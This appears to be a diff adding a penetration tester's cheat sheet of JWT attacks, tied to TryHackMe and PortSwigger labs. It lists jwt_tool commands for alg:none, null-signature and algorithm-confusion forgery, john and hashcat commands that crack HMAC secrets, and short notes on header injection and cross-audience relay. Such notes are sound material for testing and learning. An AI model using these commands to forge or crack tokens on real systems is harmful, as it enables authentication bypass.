@@ -1,0 +1,60 @@
+###########
+### jwt ###
+###########
+## links
+# https://jwt.io/
+# https://tryhackme.com/r/room/jwtsecurity
+
+
+## jwt_tool
+cd /opt/jwt_tool
+python jwt_tool.py TOKEN							# check info
+python jwt_tool.py TOKEN -T							# Tamper values
+python jwt_tool.py TOKEN -X n							# Null signature
+python jwt_tool.py TOKEN -X a							# alg:none
+
+
+
+## no signature check
+# check without signature, should not work
+curl -H 'Authorization: Bearer aaaXXXaaa.aaaXXXaaa.' http://10.10.96.77/api/v1.0/example2?username=user
+# exploit
+python jwt_tool.py TOKEN -T                                                     # Tamper values
+python jwt_tool.py TOKEN -X n                                                   # Null signature
+
+
+## tamper algo to none
+# exploit
+python jwt_tool.py TOKEN -T                                                     # Tamper values
+python jwt_tool.py TOKEN -X a                                                   # alg:none
+
+
+## bruteforce symmetric pass
+echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtPYbhblaPQsbeClcw" > jwt.hash
+john --wordlist=~/secu/dict/rockyou.txt jwt.hash --format=HMAC-SHA256
+john --wordlist=~/secu/dict/rockyou.txt jwt.hash --format=HMAC-SHA384
+john --wordlist=~/secu/dict/rockyou.txt jwt.hash --format=HMAC-SHA512
+hashcat -m 16500 jwt.hash ~/secu/dict/rockyou.txt --force			# JWT (JSON Web Token)
+python jwt_tool.py TOKEN -T                                                     # Tamper values
+python jwt_tool.py TOKEN -S hs256 -p password					# Sign with cracked pass
+
+
+## algorithm confusion
+# public key is found and RS algo could be change by HS algo
+python jwt_tool.py TOKEN -T                                                     # Tamper values AND algo=HS256
+python jwt_tool.py TOKEN -S hs256 -p "ssh-rsa XXX"                              # Sign with pubkey
+
+
+## Lifetimes
+# token must have a "exp" attribute and must expire
+# try to see if an expired token is still valid
+
+
+## Header Injection
+# https://github.com/frank-leitner/portswigger-websecurity-academy/tree/main/23_JWT_attacks/JWT_authentication_bypass_via_jwk_header_injection
+
+
+## Cross-Service Relay Attacks
+# if multi app AND jwt has "audience" attribute
+# get admin on 1 audience and use it on another audience
+
